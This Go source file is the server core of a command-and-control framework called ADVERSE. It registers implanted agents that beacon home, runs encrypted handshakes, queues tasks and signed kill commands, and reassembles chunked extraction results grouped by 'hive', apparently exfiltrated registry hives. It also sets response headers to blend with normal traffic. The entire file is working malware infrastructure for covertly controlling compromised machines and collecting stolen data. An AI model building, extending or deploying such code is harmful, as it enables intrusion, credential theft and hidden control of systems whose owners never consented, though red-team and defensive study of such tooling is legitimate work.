// Package server implements the ADVERSE C2 server core: agent registry, per-
// agent task queues, result collection with chunk reassembly, kill-signing
// with monotonic epoch management, and atomic state persistence.
//
// Session keys are memory-only: a server restart requires agents to re-hello.
// Kill epoch floors are persisted so a fresh kill for a live agent always
// exceeds whatever the agent last accepted.
package server

import (
	"crypto/ecdh"
	"crypto/ed25519"
	"crypto/sha256"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"log/slog"
	"os"
	"path/filepath"
	"sort"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/ashwnn/adverse-go/internal/cryptokeys"
	"github.com/ashwnn/adverse-go/internal/wire"
)

// Chunk reassembly bounds per job.
const (
	MaxChunksPerJob = 10000             // maximum distinct sequence numbers per job
	MaxBytesPerJob  = 512 * 1024 * 1024 // maximum total decoded chunk bytes per job (512 MB)

	// DefaultChunkRetention is how long terminal chunk reassembly state is
	// retained for operator retrieval after its task reaches a terminal state.
	DefaultChunkRetention = time.Hour
	// DefaultMaxRetainedChunkJobs caps how many terminal chunk jobs are kept.
	DefaultMaxRetainedChunkJobs = 64
)

// AgentRecord holds per-agent state in the server registry.
type AgentRecord struct {
	AgentID    string
	SessionKey [32]byte // forward-secret session key (ephemeral ECDH)
	Prefix     [3]byte  // session frame prefix (FS key)
	TxSeq      uint32
	RxWindow   *wire.ReplayWindow
	LastSeen   time.Time
	Online     bool

	// Hello-ack material (static-ECDH handshake). Never persisted: only
	// AgentState is serialized, not AgentRecord. ServerEphPub is the public
	// component included in the hello ack; the corresponding private key is
	// discarded immediately after deriving the forward-secret session key and
	// is never stored, preserving forward secrecy.
	HandshakeKey    [32]byte
	HandshakePrefix [3]byte
	ServerEphPub    [32]byte
}

// chunkPiece is one received chunk: hive name plus decoded payload bytes.
type chunkPiece struct {
	hive string
	data []byte
}

// Chunk tracks one in-progress job's reassembly state. CompletedAt is set once
// the job's task reaches a terminal state or every chunk has arrived; it lets
// pruneChunksLocked bound retention while keeping retrieval working within
// ChunkRetention.
type Chunk struct {
	Total       int
	Chunks      map[uint32]chunkPiece
	ChunkSize   int       // total decoded bytes across all chunks
	CompletedAt time.Time // when the job became terminal/reassembly-complete
}

// ResultEntry is a stored result for an agent.
type ResultEntry struct {
	TaskID  string  `json:"task_id"`
	Payload string  `json:"payload"`
	Ts      float64 `json:"ts"`
}

// AgentState is the persisted agent metadata.
type AgentState struct {
	AgentID   string  `json:"agent_id"`
	LastSeen  float64 `json:"last_seen"`
	KillEpoch uint64  `json:"kill_epoch"`
	Online    bool    `json:"online"`
}

// StateData is the full persisted state.
type StateData struct {
	Updated float64                  `json:"updated"`
	Agents  map[string]AgentState    `json:"agents"`
	Results map[string][]ResultEntry `json:"results"`
	Tasks   map[string]Task          `json:"tasks,omitempty"`
}

// Server is the in-process C2 core.
type Server struct {
	mu sync.Mutex

	// Key material
	SecretBytes    [32]byte
	ServerXPriv    *ecdh.PrivateKey
	ServerSignPriv ed25519.PrivateKey

	// Registry
	Registry map[string]*AgentRecord

	// SID dedup
	SeenSIDs map[string]time.Time
	MaxSIDs  int

	// Tasks: task_id -> lifecycle record; TaskOrder holds per-agent FIFOs of
	// queued task IDs. Wire task messages are rendered on dispatch.
	Tasks     map[string]*Task
	TaskOrder map[string][]string

	// Results: agent_id -> slice of ResultEntry
	Results            map[string][]ResultEntry
	MaxResultsPerAgent int

	// audit appends operator/server events to StateDir/audit.jsonl.
	audit *auditLogger

	// Chunk reassembly: job_id -> *Chunk
	Chunks map[string]*Chunk
	// ChunkRetention is how long terminal chunk state is retrievable after
	// the job's task reaches a terminal state. Defaults to an hour.
	ChunkRetention time.Duration
	// MaxRetainedChunkJobs caps retained terminal chunk jobs. Defaults to 64.
	MaxRetainedChunkJobs int

	// Kill
	KillEpoch     atomic.Uint64
	AgentLastKill map[string]uint64

	// State persistence
	StateDir string

	// Profile settings
	BeaconIntervalS int
	BeaconJitterS   int

	// Logging
	Logger *slog.Logger

	// Response headers for blending
	responseHeaders map[string]string
}

// New creates a new Server from a fleet secret hex string and config.
func New(secretHex string, logger *slog.Logger) (*Server, error) {
	if logger == nil {
		logger = slog.Default()
	}
	secretBytes, err := cryptokeys.Secret32(secretHex)
	if err != nil {
		return nil, fmt.Errorf("secret: %w", err)
	}
	serverXPriv, err := cryptokeys.DeriveServerKey(secretBytes)
	if err != nil {
		return nil, fmt.Errorf("derive server key: %w", err)
	}
	serverSignPriv, err := cryptokeys.DeriveSignKey(secretBytes)
	if err != nil {
		return nil, fmt.Errorf("derive sign key: %w", err)
	}
	s := &Server{
		SecretBytes:          secretBytes,
		ServerXPriv:          serverXPriv,
		ServerSignPriv:       serverSignPriv,
		Registry:             make(map[string]*AgentRecord),
		SeenSIDs:             make(map[string]time.Time),
		MaxSIDs:              4096,
		Tasks:                make(map[string]*Task),
		TaskOrder:            make(map[string][]string),
		Results:              make(map[string][]ResultEntry),
		MaxResultsPerAgent:   1000,
		Chunks:               make(map[string]*Chunk),
		ChunkRetention:       DefaultChunkRetention,
		MaxRetainedChunkJobs: DefaultMaxRetainedChunkJobs,
		AgentLastKill:        make(map[string]uint64),
		BeaconIntervalS:      30,
		BeaconJitterS:        10,
		Logger:               logger,
		audit:                newAuditLogger("", logger),
	}
	s.KillEpoch.Store(1)
	return s, nil
}

// ComputeBootstrapKey returns the PSK-derived bootstrap key for hello frames.
func (s *Server) ComputeBootstrapKey() [32]byte {
	k, _ := cryptokeys.BootstrapKey(s.SecretBytes)
	return k
}

// RegisterAgent processes a hello message and registers (or updates) the agent.
// Returns the AgentRecord or nil on failure.
func (s *Server) RegisterAgent(agentID string, msg map[string]any) *AgentRecord {
	s.mu.Lock()
	defer s.mu.Unlock()

	payloadStr, _ := msg["payload"].(string)
	var info map[string]any
	if payloadStr != "" {
		_ = json.Unmarshal([]byte(payloadStr), &info)
	}
	if info == nil {
		info = make(map[string]any)
	}

	ephPubHex, _ := info["eph_pub"].(string)
	saltHex, _ := info["salt"].(string)
	sid, _ := info["sid"].(string)

	if ephPubHex == "" || saltHex == "" {
		s.Logger.Warn("hello missing eph_pub/salt", "agent", agentID)
		return nil
	}
	if sid == "" {
		s.Logger.Warn("hello missing sid", "agent", agentID)
		return nil
	}

	ephPubBytes, err := hex.DecodeString(ephPubHex)
	if err != nil || len(ephPubBytes) != 32 {
		s.Logger.Warn("bad eph_pub", "agent", agentID)
		return nil
	}
	saltBytes, err := hex.DecodeString(saltHex)
	if err != nil || len(saltBytes) != 16 {
		s.Logger.Warn("bad salt", "agent", agentID)
		return nil
	}

	var ephPub [32]byte
	copy(ephPub[:], ephPubBytes)
	var salt [16]byte
	copy(salt[:], saltBytes)

	// Forward secrecy: generate a single-use server ephemeral keypair. The
	// hello ack is encrypted under the static-ECDH handshake key (which
	// authenticates the server); all subsequent session traffic uses the
	// forward-secret key derived from this ephemeral ECDH. The ephemeral
	// private key is intentionally NOT retained after the session key is
	// derived below.
	serverEphPriv, serverEphPub, err := cryptokeys.GenEphemeral()
	if err != nil {
		s.Logger.Warn("ephemeral key generation failed", "agent", agentID, "err", err)
		return nil
	}

	handshakeKey, err := cryptokeys.HandshakeKey(s.ServerXPriv, ephPub, salt, agentID)
	if err != nil {
		s.Logger.Warn("handshake key derivation failed", "agent", agentID, "err", err)
		return nil
	}
	handshakePrefix, err := cryptokeys.FramePrefix(handshakeKey, "v2")
	if err != nil {
		s.Logger.Warn("handshake frame prefix derivation failed", "agent", agentID, "err", err)
		return nil
	}

	sessionKey, err := cryptokeys.SessionKey(serverEphPriv, ephPub, salt, agentID)
	if err != nil {
		s.Logger.Warn("session key derivation failed", "agent", agentID, "err", err)
		return nil
	}
	prefix, err := cryptokeys.FramePrefix(sessionKey, "v2")
	if err != nil {
		s.Logger.Warn("frame prefix derivation failed", "agent", agentID, "err", err)
		return nil
	}

	// SID replay protection
	if _, seen := s.SeenSIDs[sid]; seen {
		s.Logger.Warn("replayed hello sid rejected", "agent", agentID, "sid", sidHash(sid))
		return nil
	}
	now := time.Now()
	s.SeenSIDs[sid] = now
	// Evict oldest if over limit
	if len(s.SeenSIDs) > s.MaxSIDs {
		type kv struct {
			key string
			t   time.Time
		}
		sids := make([]kv, 0, len(s.SeenSIDs))
		for k, v := range s.SeenSIDs {
			sids = append(sids, kv{k, v})
		}
		sort.Slice(sids, func(i, j int) bool { return sids[i].t.Before(sids[j].t) })
		for _, entry := range sids[:len(s.SeenSIDs)-s.MaxSIDs] {
			delete(s.SeenSIDs, entry.key)
		}
	}

	ts := 0.0
	if t, ok := msg["ts"].(float64); ok {
		ts = t
	}

	rec, exists := s.Registry[agentID]
	if !exists {
		rec = &AgentRecord{
			AgentID:         agentID,
			SessionKey:      sessionKey,
			Prefix:          prefix,
			TxSeq:           0,
			RxWindow:        wire.NewReplayWindow(wire.DefaultReplayWindowSize),
			LastSeen:        time.Unix(0, int64(ts*1e9)),
			Online:          true,
			HandshakeKey:    handshakeKey,
			HandshakePrefix: handshakePrefix,
			ServerEphPub:    serverEphPub,
		}
		s.Registry[agentID] = rec
		if _, ok := s.TaskOrder[agentID]; !ok {
			s.TaskOrder[agentID] = nil
		}
		if s.Results[agentID] == nil {
			s.Results[agentID] = make([]ResultEntry, 0, s.MaxResultsPerAgent)
		}
		s.Logger.Info("new agent registered", "agent", agentID)
		s.Audit("agent.register", map[string]any{"agent": agentID})
	} else {
		rec.SessionKey = sessionKey
		rec.Prefix = prefix
		rec.TxSeq = 0
		rec.RxWindow = wire.NewReplayWindow(wire.DefaultReplayWindowSize)
		rec.LastSeen = time.Unix(0, int64(ts*1e9))
		rec.Online = true
		rec.HandshakeKey = handshakeKey
		rec.HandshakePrefix = handshakePrefix
		rec.ServerEphPub = serverEphPub
	}

	s.flushState()
	return rec
}

// HandleMessage processes a validated message from an agent.
func (s *Server) HandleMessage(agentID string, msg map[string]any) {
	msgType, _ := msg["type"].(string)
	switch msgType {
	case "beacon", "hello":
		s.handleBeacon(agentID, msg)
	case "result":
		s.handleResult(agentID, msg)
	case "ack":
		taskID, _ := msg["task_id"].(string)
		s.AckTask(agentID, taskID)
	default:
		s.Logger.Debug("unhandled message type", "type", msgType, "agent", agentID)
	}
}

func (s *Server) handleBeacon(agentID string, msg map[string]any) {
	s.mu.Lock()
	defer s.mu.Unlock()
	rec, ok := s.Registry[agentID]
	if !ok {
		return
	}
	if t, ok := msg["ts"].(float64); ok {
		rec.LastSeen = time.Unix(0, int64(t*1e9))
	}
	// Lazy expiry: retire or retry tasks whose dispatch/ack deadline passed.
	s.ExpireTasksLocked(agentID, time.Now(), s.TaskTimeout())
	s.flushState()
}

func (s *Server) handleResult(agentID string, msg map[string]any) {
	s.mu.Lock()
	defer s.mu.Unlock()
	payloadStr, _ := msg["payload"].(string)
	taskID, _ := msg["task_id"].(string)
	ts := 0.0
	if t, ok := msg["ts"].(float64); ok {
		ts = t
	}

	// Task lifecycle updates and chunk reassembly (caller already holds mu).
	if payloadStr != "" {
		var parsed map[string]any
		if err := json.Unmarshal([]byte(payloadStr), &parsed); err == nil {
			jobID, _ := parsed["job_id"].(string)
			if jobID == "" {
				jobID = taskID
			}
			if status, ok := parsed["status"].(string); ok && status != "" {
				// Non-extract task (sleep/noop/...): agent reports a status.
				errMsg := ""
				if status != "ok" {
					action, _ := parsed["action"].(string)
					errMsg = fmt.Sprintf("%s reported status %q", action, status)
				}
				s.completeTaskLocked(agentID, jobID, errMsg)
			} else if dataB64, ok := parsed["data_b64"].(string); ok {
				total := 0
				if t, ok := parsed["total"].(float64); ok {
					total = int(t)
				}
				hive, _ := parsed["hive"].(string)
				s.reassembleChunkLocked(jobID, hive, dataB64, total)
				// Extraction is complete only once every chunk 0..total-1 is
				// present; a missing chunk keeps the task in flight so the
				// retry path can refill it. Mark the chunk job terminal so
				// retention pruning can reclaim it.
				if ch, ok := s.Chunks[jobID]; ok && allChunksPresentLocked(ch) {
					if ch.CompletedAt.IsZero() {
						ch.CompletedAt = time.Now().UTC()
					}
					s.completeTaskLocked(agentID, jobID, "")
				}
			}
		}
	}

	entry := ResultEntry{
		TaskID:  taskID,
		Payload: payloadStr,
		Ts:      ts,
	}
	q := s.Results[agentID]
	if len(q) >= s.MaxResultsPerAgent {
		q = q[1:]
	}
	s.Results[agentID] = append(q, entry)
	s.flushState()
}

// completeTaskLocked marks a task completed or failed. Caller must hold s.mu.
func (s *Server) completeTaskLocked(agentID, taskID, errMsg string) {
	t, ok := s.taskLocked(agentID, taskID)
	if !ok {
		return
	}
	if t.State == TaskCompleted || t.State == TaskFailed || t.State == TaskExpired {
		return
	}
	state := TaskCompleted
	if errMsg != "" {
		state = TaskFailed
	}
	s.taskDoneLocked(t, state, errMsg)
}

// reassembleChunkLocked decodes a data_b64 value and stores the chunk.
// Caller must hold s.mu.
func (s *Server) reassembleChunkLocked(jobID, hive, dataB64 string, total int) {
	data, err := base64.StdEncoding.DecodeString(dataB64)
	if err != nil {
		s.Logger.Warn("bad base64 in chunk", "job", jobID, "err", err)
		return
	}
	if len(data) < 12 {
		s.Logger.Warn("chunk too short", "job", jobID, "len", len(data))
		return
	}
	seq := binary.BigEndian.Uint32(data[0:4])
	hiveLen := binary.BigEndian.Uint16(data[4:6])
	pathLen := binary.BigEndian.Uint16(data[6:8])
	dataLen := binary.BigEndian.Uint32(data[8:12])
	totalHivePath := 12 + int(hiveLen) + int(pathLen)
	if len(data) < totalHivePath {
		s.Logger.Warn("chunk hive/path truncated", "job", jobID)
		return
	}
	if int(dataLen) != len(data)-totalHivePath {
		s.Logger.Warn("chunk dataLen mismatch", "job", jobID, "dataLen", dataLen, "actual", len(data)-totalHivePath)
		// Continue with actual chunkData length for robustness
	}
	chunkData := data[totalHivePath:]

	// The chunk header carries its own hive name; prefer it, fall back to the
	// result payload hive field.
	if hive == "" {
		hive = string(data[12 : 12+hiveLen])
	}

	ch, ok := s.Chunks[jobID]
	if !ok {
		ch = &Chunk{Chunks: make(map[uint32]chunkPiece)}
		s.Chunks[jobID] = ch
	}

	// Update total if provided and larger than current
	if total > 0 && total > ch.Total {
		ch.Total = total
	}

	// Bounds: reject if per-job chunk count or total bytes exceeded.
	if len(ch.Chunks) >= MaxChunksPerJob {
		s.Logger.Warn("chunk rejected: per-job chunk count limit exceeded",
			"job", jobID, "count", len(ch.Chunks), "limit", MaxChunksPerJob)
		return
	}
	if ch.ChunkSize+len(chunkData) > MaxBytesPerJob {
		s.Logger.Warn("chunk rejected: per-job bytes limit exceeded",
			"job", jobID, "bytes", ch.ChunkSize+len(chunkData), "limit", MaxBytesPerJob)
		return
	}

	// Deduplicate: only count size for new seq, update data if resend
	if old, exists := ch.Chunks[seq]; exists {
		ch.ChunkSize -= len(old.data)
	}
	ch.Chunks[seq] = chunkPiece{hive: hive, data: chunkData}
	ch.ChunkSize += len(chunkData)
}

// allChunksPresentLocked reports whether every sequence 0..Total-1 has been
// received. A job with no declared total is never complete. Caller must hold
// s.mu.
func allChunksPresentLocked(ch *Chunk) bool {
	if ch == nil || ch.Total <= 0 || len(ch.Chunks) < ch.Total {
		return false
	}
	for i := 0; i < ch.Total; i++ {
		if _, ok := ch.Chunks[uint32(i)]; !ok {
			return false
		}
	}
	return true
}

// pruneChunksLocked bounds chunk reassembly state: terminal jobs are dropped
// once ChunkRetention has elapsed, and at most MaxRetainedChunkJobs terminal
// jobs are kept (oldest evicted first). In-progress jobs that have not
// terminated are left alone; their task lifecycle is bounded separately.
// Caller must hold s.mu.
func (s *Server) pruneChunksLocked(now time.Time) {
	retention := s.ChunkRetention
	if retention <= 0 {
		retention = DefaultChunkRetention
	}
	for id, ch := range s.Chunks {
		if ch.CompletedAt.IsZero() {
			continue
		}
		if now.Sub(ch.CompletedAt) > retention {
			delete(s.Chunks, id)
		}
	}

	maxJobs := s.MaxRetainedChunkJobs
	if maxJobs <= 0 {
		maxJobs = DefaultMaxRetainedChunkJobs
	}
	type terminalChunk struct {
		id   string
		done time.Time
	}
	var terminal []terminalChunk
	for id, ch := range s.Chunks {
		if !ch.CompletedAt.IsZero() {
			terminal = append(terminal, terminalChunk{id, ch.CompletedAt})
		}
	}
	if len(terminal) <= maxJobs {
		return
	}
	sort.Slice(terminal, func(i, j int) bool { return terminal[i].done.Before(terminal[j].done) })
	for _, c := range terminal[:len(terminal)-maxJobs] {
		delete(s.Chunks, c.id)
	}
}

// EnqueueTask queues a task for an agent and tracks its lifecycle. Returns the
// task_id. Re-enqueueing the same task_id for the same agent is idempotent;
// the same task_id for a different agent is a distinct task (idempotency is
// keyed on (agentID, taskID), so cross-agent reuse no longer drops work).
func (s *Server) EnqueueTask(agentID, taskID, action string, extra map[string]any) string {
	s.mu.Lock()
	defer s.mu.Unlock()
	if existing, ok := s.Tasks[taskMapKey(agentID, taskID)]; ok {
		return existing.ID
	}
	if _, ok := s.Registry[agentID]; !ok {
		// Agent not registered yet: still accept the task; it will be
		// dispatched on the agent's first beacon.
		s.Logger.Info("task queued for unregistered agent", "agent", agentID, "task", taskID)
	}
	t := newTask(agentID, taskID, action, extra)
	s.enqueueTaskLocked(t)
	s.flushState()
	return t.ID
}

// EnqueueKill enqueues a kill message for an agent with a signed epoch.
// The kill is tracked as a task for operator visibility.
func (s *Server) EnqueueKill(agentID, payload string) (string, uint64, error) {
	s.mu.Lock()
	defer s.mu.Unlock()

	epoch := s.KillEpoch.Load()
	floor := s.AgentLastKill[agentID]
	effective := epoch
	if floor+1 > epoch {
		effective = floor + 1
	}
	s.KillEpoch.Store(effective + 1)
	s.AgentLastKill[agentID] = effective

	// The kill signature is produced at dispatch time (NextTask); the enqueue
	// path only allocates the epoch and queues the task.
	taskID := fmt.Sprintf("kill-%d", effective)

	kt := newTask(agentID, taskID, "kill", map[string]any{"payload": payload})
	kt.Epoch = effective
	s.enqueueTaskLocked(kt)

	s.Audit("kill.enqueue", map[string]any{
		"agent": agentID, "task": taskID, "epoch": effective, "payload": payload,
	})
	s.flushState()
	return taskID, effective, nil
}

// NextTask pops the oldest queued task for an agent and marks it dispatched.
// Returns the wire task message (or kill message) and true on success.
func (s *Server) NextTask(agentID string) (map[string]any, bool) {
	s.mu.Lock()
	defer s.mu.Unlock()
	t := s.popQueuedLocked(agentID)
	if t == nil {
		return nil, false
	}
	msg := t.taskWireMessage(time.Now())
	if t.Action == "kill" {
		// Kill messages carry the epoch and signature alongside the payload.
		msg["type"] = "kill"
		payloadStr, _ := t.Payload["payload"].(string)
		if payloadStr == "" {
			payloadStr = "kill"
		}
		msg["payload"] = payloadStr
		msg["epoch"] = float64(t.Epoch)
		sig, err := cryptokeys.KillSign(s.ServerSignPriv, t.Epoch, t.AgentID, payloadStr)
		if err != nil {
			s.taskDoneLocked(t, TaskFailed, fmt.Sprintf("kill sign: %v", err))
			s.flushState()
			return nil, false
		}
		msg["sig"] = hex.EncodeToString(sig)
		// Delivery is all the server can observe: the agent exits without an
		// ack after accepting a kill. Mark completed on dispatch.
		s.taskDoneLocked(t, TaskCompleted, "")
	}
	s.flushState()
	return msg, true
}

// PendingTaskCount returns the number of queued tasks for an agent.
func (s *Server) PendingTaskCount(agentID string) int {
	s.mu.Lock()
	defer s.mu.Unlock()
	n := 0
	for _, t := range s.Tasks {
		if t.AgentID == agentID && t.State == TaskQueued {
			n++
		}
	}
	return n
}

// ResultCount returns the total number of stored result entries.
func (s *Server) ResultCount() int {
	s.mu.Lock()
	defer s.mu.Unlock()
	n := 0
	for _, q := range s.Results {
		n += len(q)
	}
	return n
}

// ListAgents returns agent metadata for the list command. Online is computed
// from beacon recency: an agent is online if its last beacon is within three
// beacon periods (interval + jitter).
func (s *Server) ListAgents() []AgentState {
	s.mu.Lock()
	defer s.mu.Unlock()
	staleness := time.Duration((s.BeaconIntervalS+s.BeaconJitterS)*3) * time.Second
	now := time.Now()
	out := make([]AgentState, 0, len(s.Registry))
	for _, rec := range s.Registry {
		out = append(out, AgentState{
			AgentID:   rec.AgentID,
			LastSeen:  float64(rec.LastSeen.UnixNano()) / 1e9,
			KillEpoch: s.AgentLastKill[rec.AgentID],
			Online:    now.Sub(rec.LastSeen) <= staleness,
		})
	}
	sort.Slice(out, func(i, j int) bool { return out[i].AgentID < out[j].AgentID })
	return out
}

// ResultsFor returns stored results for an agent.
func (s *Server) ResultsFor(agentID string) []ResultEntry {
	s.mu.Lock()
	defer s.mu.Unlock()
	cp := make([]ResultEntry, len(s.Results[agentID]))
	copy(cp, s.Results[agentID])
	return cp
}

// ChunkStatus returns the chunk reassembly status for a job_id.
func (s *Server) ChunkStatus(jobID string) (total int, received int, ok bool) {
	s.mu.Lock()
	defer s.mu.Unlock()
	ch, exists := s.Chunks[jobID]
	if !exists {
		return 0, 0, false
	}
	return ch.Total, len(ch.Chunks), true
}

// GetReassembledByHive returns the reassembled bytes grouped by hive name for
// a job whose chunks have all arrived. Returns (nil, false) if the job is not
// found or not complete.
func (s *Server) GetReassembledByHive(jobID string) (map[string][]byte, bool) {
	s.mu.Lock()
	defer s.mu.Unlock()
	ch, exists := s.Chunks[jobID]
	if !exists {
		return nil, false
	}
	if ch.Total > 0 && len(ch.Chunks) < ch.Total {
		return nil, false
	}
	if len(ch.Chunks) == 0 {
		return nil, false
	}
	seqs := make([]uint32, 0, len(ch.Chunks))
	for seq := range ch.Chunks {
		seqs = append(seqs, seq)
	}
	sort.Slice(seqs, func(i, j int) bool { return seqs[i] < seqs[j] })
	groups := make(map[string][]byte)
	for _, seq := range seqs {
		p := ch.Chunks[seq]
		groups[p.hive] = append(groups[p.hive], p.data...)
	}
	return groups, true
}

// NextTxSeq atomically increments and returns the next TxSeq for the agent.
// It holds s.mu for the increment so concurrent ServeHTTP goroutines cannot
// produce duplicate sequence numbers (which would cause ChaCha20-Poly1305 nonce
// reuse). Returns (seq, true) on success, (0, false) if agent not found.
func (s *Server) NextTxSeq(agentID string) (uint32, bool) {
	s.mu.Lock()
	defer s.mu.Unlock()
	rec, ok := s.Registry[agentID]
	if !ok {
		return 0, false
	}
	seq := rec.TxSeq
	rec.TxSeq++
	return seq, true
}

// CheckAndRecordRx atomically checks the replay window and records the seq
// if it is acceptable. Returns true if the frame should be accepted. This
// holds s.mu and uses ReplayWindow.CheckAndRecord atomically to prevent TOCTOU
// races between concurrent requests for the same agent.
func (s *Server) CheckAndRecordRx(agentID string, seq uint32) bool {
	s.mu.Lock()
	defer s.mu.Unlock()
	rec, ok := s.Registry[agentID]
	if !ok {
		return false
	}
	if rec.RxWindow == nil {
		return false
	}
	return rec.RxWindow.CheckAndRecord(seq)
}

// AgentRecordSnapshot holds a copy of agent session material taken under lock,
// so callers can safely build wire frames without holding the lock during
// crypto operations.
type AgentRecordSnapshot struct {
	SessionKey      [32]byte
	Prefix          [3]byte
	HandshakeKey    [32]byte
	HandshakePrefix [3]byte
	ServerEphPub    [32]byte
}

// SnapshotAgentRecord returns a copy of the agent's key material under lock.
func (s *Server) SnapshotAgentRecord(agentID string) (AgentRecordSnapshot, bool) {
	s.mu.Lock()
	defer s.mu.Unlock()
	rec, ok := s.Registry[agentID]
	if !ok {
		return AgentRecordSnapshot{}, false
	}
	return AgentRecordSnapshot{
		SessionKey:      rec.SessionKey,
		Prefix:          rec.Prefix,
		HandshakeKey:    rec.HandshakeKey,
		HandshakePrefix: rec.HandshakePrefix,
		ServerEphPub:    rec.ServerEphPub,
	}, true
}

// ---------------------------------------------------------------- persistence

func (s *Server) statePath() string {
	if s.StateDir == "" {
		return ""
	}
	return filepath.Join(s.StateDir, "state.json")
}

func (s *Server) flushState() {
	// Lazy retention: reclaim terminal chunk/task state on state mutations
	// even when persistence is disabled, so in-memory state stays bounded.
	s.pruneChunksLocked(time.Now())
	s.pruneTasksLocked()
	path := s.statePath()
	if path == "" {
		return
	}
	agents := make(map[string]AgentState, len(s.Registry))
	for id, rec := range s.Registry {
		agents[id] = AgentState{
			AgentID:   id,
			LastSeen:  float64(rec.LastSeen.UnixNano()) / 1e9,
			KillEpoch: s.AgentLastKill[id],
			Online:    rec.Online,
		}
	}
	results := make(map[string][]ResultEntry, len(s.Results))
	for id, q := range s.Results {
		results[id] = make([]ResultEntry, len(q))
		copy(results[id], q)
	}
	data := StateData{
		Updated: float64(time.Now().UnixNano()) / 1e9,
		Agents:  agents,
		Results: results,
		Tasks:   s.serializeTasksLocked(),
	}
	raw, err := json.MarshalIndent(data, "", "  ")
	if err != nil {
		s.Logger.Warn("state marshal failed", "err", err)
		return
	}
	dir := filepath.Dir(path)
	if err := os.MkdirAll(dir, 0700); err != nil {
		s.Logger.Error("state dir create failed", "dir", dir, "err", err)
		return
	}
	tmp := path + ".tmp"
	if err := os.WriteFile(tmp, raw, 0600); err != nil {
		s.Logger.Error("state tmp write failed", "path", tmp, "err", err)
		return
	}
	if err := os.Rename(tmp, path); err != nil {
		s.Logger.Error("state rename failed", "path", path, "err", err)
		_ = os.Remove(tmp)
		return
	}
}

// LoadState loads persisted state from state.json if it exists.
func (s *Server) LoadState() error {
	path := s.statePath()
	if path == "" {
		return nil
	}
	raw, err := os.ReadFile(path)
	if err != nil {
		if os.IsNotExist(err) {
			return nil
		}
		return err
	}
	var data StateData
	if err := json.Unmarshal(raw, &data); err != nil {
		return err
	}
	s.mu.Lock()
	defer s.mu.Unlock()
	// Restore agent registry with placeholder offline records (session keys
	// are memory-only; agents must re-hello after restart).
	for id, ag := range data.Agents {
		if _, exists := s.Registry[id]; !exists {
			s.Registry[id] = &AgentRecord{
				AgentID:  id,
				LastSeen: time.Unix(0, int64(ag.LastSeen*1e9)),
				Online:   false,
			}
		}
		if s.Results[id] == nil {
			s.Results[id] = make([]ResultEntry, 0, s.MaxResultsPerAgent)
		}
	}
	// Restore kill floors
	for id, ag := range data.Agents {
		if ag.KillEpoch > 0 {
			s.AgentLastKill[id] = ag.KillEpoch
		}
		if ag.KillEpoch >= s.KillEpoch.Load() {
			s.KillEpoch.Store(ag.KillEpoch + 1)
		}
	}
	// Restore results
	for id, res := range data.Results {
		s.Results[id] = make([]ResultEntry, len(res))
		copy(s.Results[id], res)
	}
	// Restore task lifecycle (dispatched/acked revert to queued).
	s.restoreTasksLocked(data.Tasks)
	// Point the audit logger at the assigned state dir.
	s.audit.setStateDir(s.StateDir)
	return nil
}

// ListAgentIDs returns all registered agent IDs.
func (s *Server) ListAgentIDs() []string {
	s.mu.Lock()
	defer s.mu.Unlock()
	ids := make([]string, 0, len(s.Registry))
	for id := range s.Registry {
		ids = append(ids, id)
	}
	return ids
}

// GetResponseHeaders returns the configured response headers for blending.
func (s *Server) GetResponseHeaders() map[string]string {
	if s.responseHeaders == nil {
		return nil
	}
	return s.responseHeaders
}

// SetResponseHeaders stores response headers for blending.
func (s *Server) SetResponseHeaders(h map[string]string) {
	s.responseHeaders = h
}

// PollDropFiles checks the queue/ subdirectory for task drop-files from
// cross-process tasking, ingests them, and deletes the files.
func (s *Server) PollDropFiles() {
	if s.StateDir == "" {
		return
	}
	queueDir := filepath.Join(s.StateDir, "queue")
	entries, err := os.ReadDir(queueDir)
	if err != nil {
		return
	}
	for _, e := range entries {
		if e.IsDir() || !strings.HasSuffix(e.Name(), ".json") {
			continue
		}
		path := filepath.Join(queueDir, e.Name())

		// Reject non-regular files and symlinks via Lstat before read/remove.
		fi, lstatErr := os.Lstat(path)
		if lstatErr != nil {
			s.Logger.Warn("PollDropFiles: Lstat failed, skipping", "path", path, "err", lstatErr)
			continue
		}
		if fi.Mode()&os.ModeType != 0 {
			s.Logger.Warn("PollDropFiles: skipping non-regular file", "path", path, "mode", fi.Mode().String())
			continue
		}

		raw, err := os.ReadFile(path)
		if err != nil {
			continue
		}
		var task struct {
			AgentID string         `json:"agent_id"`
			Action  string         `json:"cmd"`
			Args    string         `json:"args"`
			Ts      float64        `json:"ts"`
			TaskID  string         `json:"task_id"`
			Payload map[string]any `json:"payload"`
		}
		if err := json.Unmarshal(raw, &task); err != nil || task.AgentID == "" || task.Action == "" {
			_ = os.Remove(path)
			continue
		}
		taskID := task.TaskID
		if taskID == "" {
			taskID = fmt.Sprintf("drop-%d", time.Now().UnixNano())
		}
		// Kill commands are signed and enqueued as kill messages.
		if task.Action == "kill" {
			killPayload := task.Args
			if killPayload == "" {
				killPayload = "kill"
			}
			s.EnqueueKill(task.AgentID, killPayload)
			_ = os.Remove(path)
			continue
		}
		s.EnqueueTask(task.AgentID, taskID, task.Action, task.Payload)
		_ = os.Remove(path)
	}
}

// sidHash returns the first 8 hex characters of the SHA-256 of a SID string,
// for safe logging without leaking raw session identifiers.
func sidHash(sid string) string {
	h := sha256.Sum256([]byte(sid))
	return hex.EncodeToString(h[:4])
}

// Audit appends an operator/server event to the JSONL audit log in StateDir.
// Fields must contain only scalars or small identifiers; never secrets, keys,
// or hive bytes.
func (s *Server) Audit(action string, fields map[string]any) {
	if s.audit == nil {
		return
	}
	s.audit.Log(action, fields)
}

// SetStateDir sets the state directory and re-points the audit logger.
func (s *Server) SetStateDir(dir string) {
	s.mu.Lock()
	defer s.mu.Unlock()
	s.StateDir = dir
	s.audit.setStateDir(dir)
}
